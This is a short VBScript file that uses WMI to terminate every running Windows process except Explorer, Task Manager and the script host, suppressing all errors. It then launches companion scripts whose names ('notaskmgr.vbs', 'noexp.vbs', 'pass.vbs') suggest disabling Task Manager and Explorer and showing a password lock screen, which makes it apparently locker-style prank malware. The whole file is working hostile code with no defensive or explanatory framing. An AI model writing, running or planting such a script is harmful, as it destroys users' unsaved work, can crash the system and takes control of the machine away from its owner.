Option Explicit

Sub CloseAllApps()
	Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process")

    For Each objProcess in colProcesses
        On Error Resume Next
		If LCase(objProcess.Name) <> "explorer.exe" And _
		   LCase(objProcess.Name) <> "taskmgr.exe" And _
           LCase(objProcess.Name) <> "wscript.exe" Then
			objProcess.Terminate()
		End If
        On Error GoTo 0
    Next
End Sub

CloseAllApps

Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "notaskmgr.vbs", 0, False
shell.Run "noexp.vbs", 0, False
shell.Run "pass.vbs", 1, True